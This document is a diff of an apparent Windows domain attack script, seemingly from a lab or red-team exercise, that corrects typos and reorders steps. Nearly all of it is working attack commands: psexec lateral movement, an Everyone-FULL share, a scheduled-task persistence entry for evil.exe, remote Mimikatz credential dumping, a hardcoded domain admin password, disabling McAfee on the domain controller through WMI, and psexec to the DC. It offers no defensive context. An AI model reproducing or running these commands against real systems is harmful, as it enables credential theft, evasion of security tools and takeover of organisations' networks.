@@ -1,4 +1,5 @@
 "Initial  access"
+cmdinspector
 whoami
 hostname
 cd c:\
@@ -36,12 +37,12 @@ Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \
 Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c c:\exploit\pstools\psexec.exe \\defender-win10 cmd.exe /c net share exploit=c:\exploit /grant:Everyone,FULL " -WindowStyle Hidden -WorkingDirectory "c:\exploit\pstools\"
 
 "Creating Persistence"
+net use z: \\defender-win10\exploit
 xcopy c:\exploit\evil.exe z:\ /E /y
 dir z:\
-Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c schtasks /create /sc minute /mo 360 /tn eviltask /tr c:\exploit\evil.exe /ru danny /s defender-win10" -WindowStyle Hidden -WorkingDirectory "C:\Windows\sytem32"
+Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c schtasks /create /sc minute /mo 360 /tn eviltask /tr c:\exploit\evil.exe /ru danny /s defender-win10" -WindowStyle Hidden -WorkingDirectory "C:\Windows\system32"
 
 "Copy Mimikatz"
-net use z: \\defender-win10\exploit
 xcopy c:\exploit\mimikatz\ z:\mimikatz\ /E /y
 dir z:\mimikatz
 "Run Mimikatz On Remote PC"
@@ -49,16 +50,15 @@ Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c c:\exploit\p
 dir c:\exploit
 get-content mimiout.txt
 
-
 "Gaining Domain Admin!!!"
 $password = 'Cadmin!'
 $user = "sec.content\Administrator"
 $securepassword= ConvertTo-SecureString -String $password -AsPlainText -Force
 $admincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $securepassword
-Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c whoami /group" -WindowStyle Hidden -WorkingDirectory "C:\Windows\sytem32"
+Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c whoami /group" -WindowStyle Hidden -WorkingDirectory "C:\Windows\system32"
 
 "WMI Execution To DC"
-Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c wmic /node:dcontent service where name="McAfee Endpoint Security Threat Prevention" call stopservice /nointeractive " -WindowStyle Hidden -WorkingDirectory "C:\Windows\sytem32"
+Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c wmic /node:dcontent service where `"name='McAfee Endpoint Security Threat Prevention'`" call stopservice /nointeractive " -WindowStyle Hidden -WorkingDirectory "C:\Windows\system32"
 
 "PsExec To the DC"
 Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c c:\exploit\pstools\psexec.exe \\dcontent cmd.exe /c mkdir c:\exploit "  -WindowStyle Hidden  -WorkingDirectory "c:\exploit\pstools\"
